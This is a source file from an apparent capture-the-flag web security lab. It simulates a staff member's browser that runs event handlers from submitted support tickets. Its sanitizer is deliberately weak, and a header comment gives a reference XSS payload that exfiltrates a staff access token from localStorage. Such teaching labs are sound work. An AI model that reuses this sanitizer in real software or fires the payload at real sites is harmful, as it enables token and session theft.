// labs/r05-binanse/app/bot.mjs — the "simulated staff browser". When a user asks for a staff review of a support
// ticket, this module runs the ticket body the way a sloppy client-side sanitizer + a DevOps engineer's browser would:
// it strips <script> and javascript: (so those are blocked) but then executes every remaining on<event>= handler in a
// node:vm context that mimics the engineer's browser — a localStorage holding the DevOps access token (bn_staff_token),
// a cookie that carries bn_staff=<token>, and a fetch() that can call the app. The flag is never exposed here; the
// context has no require/process/fs/Node objects, and codeGeneration disables eval/new Function/WebAssembly so a payload
// cannot reach Node. The reference vector is a classic event-handler exfiltration:
//   <img src=x onerror="fetch('/api/attacker/inbox',{method:'POST',headers:{'content-type':'text/plain'},body:localStorage.getItem('bn_staff_token')})">
import vm from 'node:vm';

/** Naive sanitizer: block <script>…</script> and javascript:, but leave on<event>= handlers in place. */
export function sanitizeBody(raw) {
  return String(raw ?? '')
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/javascript\s*:/gi, '');
}

/** Extract every on<event>= attribute value (double-quoted, single-quoted or unquoted), in document order. */
export function extractHandlers(html) {
  const out = [];
  const re = /\son[a-zA-Z][\w-]*\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/g;
  let m;
  while ((m = re.exec(html)) !== null) {
    const code = (m[1] ?? m[2] ?? m[3] ?? '').trim();
    if (code) out.push(code);
  }
  return out;
}

function headerObject(headers) {
  const out = {};
  if (headers && typeof headers === 'object') {
    if (typeof headers.entries === 'function') {
      for (const [k, v] of headers.entries()) out[k] = v;
    } else {
      Object.assign(out, headers);
    }
  }
  return out;
}

/**
 * Run `rawBody` through the simulated DevOps browser. `baseUrl` is the app origin (http://127.0.0.1:<port>) the bot
 * calls back into; `staffToken` is the DevOps access token stored in the bot's localStorage and sent as a cookie.
 * Every handler runs with a 1 s execution timeout and all fired fetches are awaited before this resolves.
 */
export async function simulateStaffBrowser(rawBody, { baseUrl, staffToken }) {
  const body = sanitizeBody(rawBody);
  const handlers = extractHandlers(body);
  if (handlers.length === 0) return { ran: 0 };

  const pending = [];
  const host = new URL(baseUrl).host;

  // Relative URLs only, prefixed with the app base, carrying the DevOps cookie. Returns a minimal fetch-like response.
  async function doFetch(input, init = {}) {
    const url = String(input ?? '');
    if (!/^\/(?!\/)/.test(url)) throw new Error('bot fetch: relative URLs only');
    const headers = headerObject(init.headers);
    headers.cookie = `bn_staff=${staffToken}`;
    const signal = AbortSignal.timeout(2000);
    const res = await fetch(baseUrl + url, {
      method: String(init.method || 'GET').toUpperCase(),
      headers,
      body: init.body ?? undefined,
      signal,
    });
    const text = await res.text();
    return {
      ok: res.ok,
      status: res.status,
      text: async () => text,
      json: async () => JSON.parse(text),
    };
  }

  const track = (input, init = {}) => {
    const p = doFetch(input, init);
    pending.push(p);
    return p;
  };
  const fetcher = (input, init) => track(input, init);
  class Image { set src(value) { track(value); } get src() { return ''; } }

  const document = { cookie: 'bn_theme=dark' }; // the engineer's browser has a theme cookie, never the token
  const localStorage = {
    getItem(key) { return key === 'bn_staff_token' ? staffToken : null; },
    setItem() {}, removeItem() {}, clear() {}, key() { return null; }, get length() { return 0; },
  };
  const location = { href: `${baseUrl}/`, origin: baseUrl, protocol: 'http:', host, pathname: '/', search: '', hash: '' };
  const console = Object.fromEntries(
    ['log', 'error', 'warn', 'info', 'debug', 'trace', 'table', 'dir', 'group', 'groupEnd', 'assert', 'count', 'time', 'timeEnd']
      .map((m) => [m, () => {}]));

  const sandbox = { document, localStorage, fetch: fetcher, Image, location, console };
  const context = vm.createContext(sandbox, { codeGeneration: { strings: false, wasm: false } });

  for (const code of handlers) {
    try {
      vm.runInContext(code, context, { timeout: 1000 });
    } catch {
      // A handler that throws, times out, or is blocked is skipped; the other handlers still run.
    }
  }

  // Await all fired fetch promises, including one level of .then() chaining, then stop.
  let guard = 0;
  while (pending.length && guard++ < 20) {
    const batch = pending.splice(0, pending.length);
    await Promise.allSettled(batch);
  }

  return { ran: handlers.length };
}
